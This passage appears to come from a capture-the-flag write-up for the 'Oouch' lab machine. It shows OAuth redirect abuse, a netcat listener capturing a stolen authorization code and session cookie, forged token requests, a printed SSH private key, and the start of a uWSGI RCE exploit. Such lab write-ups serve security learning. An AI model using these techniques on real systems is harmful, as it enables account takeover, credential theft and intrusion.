+</code></pre><p>Let&rsquo;s try this URL:</p><p>If we confirm the authorization we receive the Authorization Grant URL like earlier.</p><pre tabindex=0><code>$ nc -nlvp 8888
+Connection from 10.10.15.142:41502
+GET /?code=68fq0Y8Anbh0Elid3ERKvrb9UCzsbO HTTP/1.1
+Host: 10.10.15.142:8888
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://authorization.oouch.htb:8000/oauth/authorize/?response_type=code&amp;client_id=ZOm8R6GdrX3CacO5mvG3pVuSYcKQWXrpN8aSCDuX&amp;redirect_uri=http://10.10.15.142:8888/&amp;grant_type=authorization_code&amp;client_secret=Wy3JSx7w98SUgoKC1SldvjndEVATgXnoh7WgkLWNkWSWlgnxUniRqHbIRsGAZvxsMQUo1bB2XojK3jNZ7lCCpdIBIkCXspP4H2SveQ3GXHd49F3ACp3mgFddkIcmDJAs
+Connection: close
+Upgrade-Insecure-Requests: 1
+</code></pre><h3 id=2nd-oauth-exploitation>2nd oAuth exploitation<a hidden class=anchor aria-hidden=true href=#2nd-oauth-exploitation>#</a></h3><p>Let&rsquo;s go back to the contact page (<a href=http://consumer.oouch.htb:5000/contact>http://consumer.oouch.htb:5000/contact</a>) and use the pseudo-SSRF to gain qtc access, not to the consumer site but to the provider site this time.</p><p>After a few minutes we receive the cookie of qtc:</p><pre tabindex=0><code>$ nc -nlvp 8888
+Connection from 10.10.10.177:55806
+GET /?error=invalid_request&amp;error_description=Missing+response_type+parameter. HTTP/1.1
+Host: 10.10.15.142:8888
+User-Agent: python-requests/2.21.0
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Cookie: sessionid=08lyfd5lxftdn9v5gd7knjxok4unsf0e;
+</code></pre><p>Let&rsquo;s request <a href=http://authorization.oouch.htb:8000/>http://authorization.oouch.htb:8000/</a> but with qtc&rsquo;s cookie.</p><p>We are now logged in as qtc:</p><p>As listed on the home page there is a token endpoint but it seems not reachable with GET, so let&rsquo;s try a POST (as explained in Oracle oAuth doc anyway). The doc also tells us which params to use.</p><pre tabindex=0><code>POST /oauth/token/ HTTP/1.1
+Host: authorization.oouch.htb:8000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: sessionid=08lyfd5lxftdn9v5gd7knjxok4unsf0e; csrftoken=w8Q1tZ5XGQnYIfsjJMNksuQoCg5yYHOtkiWHEK2j8Xsu4ti75whbRr32oLBxC6bZ
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 223
+
+grant_type=client_credentials&amp;client_id=ZOm8R6GdrX3CacO5mvG3pVuSYcKQWXrpN8aSCDuX&amp;client_secret=Wy3JSx7w98SUgoKC1SldvjndEVATgXnoh7WgkLWNkWSWlgnxUniRqHbIRsGAZvxsMQUo1bB2XojK3jNZ7lCCpdIBIkCXspP4H2SveQ3GXHd49F3ACp3mgFddkIcmDJAs```
+
+We receive this error:
+
+```json
+{&#34;error&#34;: &#34;unauthorized_client&#34;}
+</code></pre><p>So let&rsquo;s log as <code>cyfun2</code> again, access the app params (<a href=http://authorization.oouch.htb:8000/oauth/applications/2/>http://authorization.oouch.htb:8000/oauth/applications/2/</a>) and change <em>Authorization Grant Type</em> to <code>client-credentials</code>.</p><p>Now we can spoof qtc cookie again and retry.</p><p>This time we obtain a much better answer:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>{
+</span></span><span style=display:flex><span>  <span style=color:#f92672>&#34;access_token&#34;</span>: <span style=color:#e6db74>&#34;Xkuzgir8C38MeCv2xyq08PFMDF5NwX&#34;</span>,
+</span></span><span style=display:flex><span>  <span style=color:#f92672>&#34;expires_in&#34;</span>: <span style=color:#ae81ff>600</span>,
+</span></span><span style=display:flex><span>  <span style=color:#f92672>&#34;token_type&#34;</span>: <span style=color:#e6db74>&#34;Bearer&#34;</span>,
+</span></span><span style=display:flex><span>  <span style=color:#f92672>&#34;scope&#34;</span>: <span style=color:#e6db74>&#34;read write&#34;</span>
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><h3 id=get-qtc-ssh-key>Get qtc SSH key<a hidden class=anchor aria-hidden=true href=#get-qtc-ssh-key>#</a></h3><p>Let&rsquo;s remember of <code>o_auth_notes.txt</code>:</p><pre tabindex=0><code>/api/get_user -&gt; user data. oauth/authorize -&gt; Now also supports GET method.
+</code></pre><p>By using this endpoint we gain nothing:</p><pre tabindex=0><code>GET /api/get_user/?access_token=Xkuzgir8C38MeCv2xyq08PFMDF5NwX HTTP/1.1
+Host: authorization.oouch.htb:8000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: csrftoken=34Evh3Q30RWq1vsa9yWKKc49TXMo3c2TNv96AXeKrL4qD3ZLf9JbDwzKtjRzFPn5; sessionid=08lyfd5lxftdn9v5gd7knjxok4unsf0e
+Upgrade-Insecure-Requests: 1
+</code></pre><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>{<span style=color:#f92672>&#34;username&#34;</span>: <span style=color:#e6db74>&#34;qtc&#34;</span>, <span style=color:#f92672>&#34;firstname&#34;</span>: <span style=color:#e6db74>&#34;&#34;</span>, <span style=color:#f92672>&#34;lastname&#34;</span>: <span style=color:#e6db74>&#34;&#34;</span>, <span style=color:#f92672>&#34;email&#34;</span>: <span style=color:#e6db74>&#34;qtc@nonexistend.nonono&#34;</span>}
+</span></span></code></pre></div><p>As we heard of a ssh key in <code>todo.txt</code>, let&rsquo;s try <code>get_ssh</code> instead of <code>get_user</code>.</p><pre tabindex=0><code>GET /api/get_ssh/?access_token=Xkuzgir8C38MeCv2xyq08PFMDF5NwX HTTP/1.1
+Host: authorization.oouch.htb:8000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: csrftoken=34Evh3Q30RWq1vsa9yWKKc49TXMo3c2TNv96AXeKrL4qD3ZLf9JbDwzKtjRzFPn5; sessionid=08lyfd5lxftdn9v5gd7knjxok4unsf0e
+Upgrade-Insecure-Requests: 1
+</code></pre><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>{<span style=color:#f92672>&#34;ssh_server&#34;</span>: <span style=color:#e6db74>&#34;consumer.oouch.htb&#34;</span>, <span style=color:#f92672>&#34;ssh_user&#34;</span>: <span style=color:#e6db74>&#34;qtc&#34;</span>, <span style=color:#f92672>&#34;ssh_key&#34;</span>: <span style=color:#e6db74>&#34;-----BEGIN OPENSSH PRIVATE KEY-----\n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\n-----END OPENSSH PRIVATE KEY-----&#34;</span>}
+</span></span></code></pre></div><p>So here is the private key of qtc:</p><pre tabindex=0><code>-----BEGIN OPENSSH PRIVATE KEY-----
+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
+-----END OPENSSH PRIVATE KEY-----
+</code></pre><h3 id=ssh-access-with-qtc>SSH Access with qtc<a hidden class=anchor aria-hidden=true href=#ssh-access-with-qtc>#</a></h3><pre tabindex=0><code>$ chmod 600 id_rsa
+$ ssh -i id_rsa qtc@oouch.htb
+Linux oouch 4.19.0-8-amd64 #1 SMP Debian 4.19.98-1 (2020-01-26) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Tue Feb 25 12:45:55 2020 from 10.10.14.3
+qtc@oouch:~$ cat user.txt 
+2dea47702ee688171c4918703f46cb3c
+</code></pre><h3 id=privilege-escalation--docker-credential-stuffing>Privilege Escalation : docker credential stuffing<a hidden class=anchor aria-hidden=true href=#privilege-escalation--docker-credential-stuffing>#</a></h3><p>Let&rsquo;s see if there is a hint:</p><pre tabindex=0><code>qtc@oouch:~$ ls -lA
+total 28
+lrwxrwxrwx 1 root root    9 Feb 11 18:34 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 qtc  qtc   220 Feb 11 18:11 .bash_logout
+-rw-r--r-- 1 qtc  qtc  3526 Feb 11 18:11 .bashrc
+drwx------ 3 qtc  qtc  4096 Feb 25 12:45 .gnupg
+-rw-r--r-- 1 root root   55 Feb 11 18:34 .note.txt
+-rw-r--r-- 1 qtc  qtc   807 Feb 11 18:11 .profile
+drwx------ 2 qtc  qtc  4096 Feb 11 18:34 .ssh
+-rw------- 1 qtc  qtc    33 Jun 30 10:00 user.txt
+qtc@oouch:~$ cat .note.txt 
+Implementing an IPS using DBus and iptables == Genius?
+</code></pre><p>Let&rsquo;s see about dbus process:</p><pre tabindex=0><code>$ ps -ef f | grep dbus
+root      2688     1  0 09:59 ?        Ss     0:00 /root/dbus-server
+message+  2690     1  0 09:59 ?        Ss     0:02 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
+</code></pre><p>Let&rsquo;s check a dbus trick on <a href=https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus>hacktricks</a>:</p><p><code>/etc/dbus-1/system.d/htb.oouch.Block.conf</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#75715e>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span> <span style=color:#75715e>&lt;!-- -*- XML -*- --&gt;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!DOCTYPE busconfig PUBLIC
+</span></span></span><span style=display:flex><span><span style=color:#75715e> &#34;-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN&#34;
+</span></span></span><span style=display:flex><span><span style=color:#75715e> &#34;http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd&#34;&gt;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;busconfig&gt;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;policy</span> <span style=color:#a6e22e>user=</span><span style=color:#e6db74>&#34;root&#34;</span><span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;allow</span> <span style=color:#a6e22e>own=</span><span style=color:#e6db74>&#34;htb.oouch.Block&#34;</span><span style=color:#f92672>/&gt;</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;/policy&gt;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;policy</span> <span style=color:#a6e22e>user=</span><span style=color:#e6db74>&#34;www-data&#34;</span><span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>&lt;allow</span> <span style=color:#a6e22e>send_destination=</span><span style=color:#e6db74>&#34;htb.oouch.Block&#34;</span><span style=color:#f92672>/&gt;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>&lt;allow</span> <span style=color:#a6e22e>receive_sender=</span><span style=color:#e6db74>&#34;htb.oouch.Block&#34;</span><span style=color:#f92672>/&gt;</span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;/policy&gt;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/busconfig&gt;</span>
+</span></span></code></pre></div><p><code>www-data</code> can receive and send message from dbus.</p><p>Let&rsquo;s find something else.</p><p>As docker is running let&rsquo;s see the address ranges:</p><pre tabindex=0><code>$ qtc@oouch:~$ ip addr show docker0 
+3: docker0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN group default 
+    link/ether 02:42:a1:27:4b:76 brd ff:ff:ff:ff:ff:ff
+    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
+       valid_lft forever preferred_lft forever
+</code></pre><p>By looking at running process we should be able to find machines in <code>172.17.0.1/16</code> range.</p><p>The Django and Flask app are running on docker containers:</p><pre tabindex=0><code>$ ps -ef f
+...
+root      3110     1  0 09:59 ?        Ssl    0:28 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
+root      3567  3110  0 10:00 ?        Sl     0:00  \_ /usr/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 5000 -container-ip 172.18.0.3 -container-port 5000
+root      3618  3110  0 10:00 ?        Sl     0:00  \_ /usr/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 8000 -container-ip 172.18.0.4 -container-port 8000
+...
+</code></pre><p>It seems we can connect on the customer Flask app host:</p><pre tabindex=0><code>qtc@oouch:~$ ssh -i id_rsa qtc@172.18.0.3
+Warning: Identity file id_rsa not accessible: No such file or directory.
+Linux aeb4525789d8 4.19.0-8-amd64 #1 SMP Debian 4.19.98-1 (2020-01-26) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Tue Jun 30 20:04:54 2020 from 172.18.0.1
+qtc@aeb4525789d8:~$
+</code></pre><p>There is a <code>/code</code> folder:</p><pre tabindex=0><code>qtc@aeb4525789d8:/code$ ls -lh
+total 44K
+-rw-r--r-- 1 root root 1.1K Feb 11 17:34 Dockerfile
+-r-------- 1 root root  568 Feb 11 17:34 authorized_keys
+-rw-r--r-- 1 root root  325 Feb 11 17:34 config.py
+-rw-r--r-- 1 root root   23 Feb 11 17:34 consumer.py
+-r-------- 1 root root 2.6K Feb 11 17:34 key
+drwxr-xr-x 4 root root 4.0K Feb 11 17:34 migrations
+-rw-r--r-- 1 root root  724 Feb 11 17:34 nginx.conf
+drwxr-xr-x 5 root root 4.0K Feb 11 17:34 oouch
+-rw-r--r-- 1 root root  241 Feb 11 17:34 requirements.txt
+-rwxr-xr-x 1 root root   89 Feb 11 17:34 start.sh
+-rw-rw-rw- 1 root root    0 Jun 30 20:07 urls.txt
+-rw-r--r-- 1 root root  163 Feb 11 17:34 uwsgi.ini
+</code></pre><p><code>start.sh</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e>#!/bin/bash
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>service ssh start
+</span></span><span style=display:flex><span>service nginx start
+</span></span><span style=display:flex><span>uwsgi --ini uwsgi.ini --chmod-sock<span style=color:#f92672>=</span><span style=color:#ae81ff>666</span>
+</span></span></code></pre></div><p><code>uwsgi.ini</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ini data-lang=ini><span style=display:flex><span><span style=color:#66d9ef>[uwsgi]</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>module</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>oouch:app</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>uid</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>www-data</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>gid</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>www-data</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>master</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>true</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>processes</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>10</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>socket</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>/tmp/uwsgi.socket</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>chmod-sock</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>777</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>vacuum</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>true</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>die-on-term</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>true</span>
+</span></span></code></pre></div><p><code>www-data</code> owns uwsgi.</p><h3 id=uwsgi-exploitation>UWSGI exploitation<a hidden class=anchor aria-hidden=true href=#uwsgi-exploitation>#</a></h3><p>Let&rsquo;s check that uwsgi runs as www-data and is in a vulnerable version.</p><pre tabindex=0><code>qtc@aeb4525789d8:~$ ps -ef | grep uwsgi
+www-data    31     1  0 08:00 ?        00:00:05 uwsgi --ini uwsgi.ini --chmod-sock=666
+www-data    32    31  0 08:00 ?        00:00:00 uwsgi --ini uwsgi.ini --chmod-sock=666
+www-data    33    31  0 08:00 ?        00:00:00 uwsgi --ini uwsgi.ini --chmod-sock=666
+www-data    34    31  0 08:00 ?        00:00:00 uwsgi --ini uwsgi.ini --chmod-sock=666
+www-data    35    31  0 08:00 ?        00:00:00 uwsgi --ini uwsgi.ini --chmod-sock=666
+www-data    36    31  0 08:00 ?        00:00:00 uwsgi --ini uwsgi.ini --chmod-sock=666
+www-data    37    31  0 08:00 ?        00:00:01 uwsgi --ini uwsgi.ini --chmod-sock=666
+www-data    38    31  0 08:00 ?        00:00:00 uwsgi --ini uwsgi.ini --chmod-sock=666
+www-data    39    31  0 08:00 ?        00:00:01 uwsgi --ini uwsgi.ini --chmod-sock=666
+www-data    40    31  0 08:00 ?        00:00:01 uwsgi --ini uwsgi.ini --chmod-sock=666
+www-data    41    31  0 08:00 ?        00:00:01 uwsgi --ini uwsgi.ini --chmod-sock=666
+qtc        140    90  0 22:06 pts/0    00:00:00 grep uwsgi
+qtc@aeb4525789d8:~$ uwsgi --version
+2.0.17.1
+</code></pre><p>I found an RCE exploit on github: <a href=https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi_exp.py>https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi_exp.py</a></p><p>We need a quick patch, on line 18-19 in <code>sz()</code>, remove or comment the if statements.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-diff data-lang=diff><span style=display:flex><span>def sz(x):
+</span></span><span style=display:flex><span>    s = hex(x if isinstance(x, int) else len(x))[2:].rjust(4, &#39;0&#39;)
+</span></span><span style=display:flex><span><span style=color:#f92672>-   if sys.version_info[0] == 3: import bytes
+</span></span></span><span style=display:flex><span><span style=color:#f92672></span><span style=color:#a6e22e>+   #if sys.version_info[0] == 3: import bytes
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span><span style=color:#f92672>-   s = bytes.fromhex(s) if sys.version_info[0] == 3 else s.decode(&#39;hex&#39;)
+</span></span></span><span style=display:flex><span><span style=color:#f92672></span><span style=color:#a6e22e>+   s = bytes.fromhex(s) #if sys.version_info[0] == 3 else s.decode(&#39;hex&#39;)
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span>    return s[::-1]
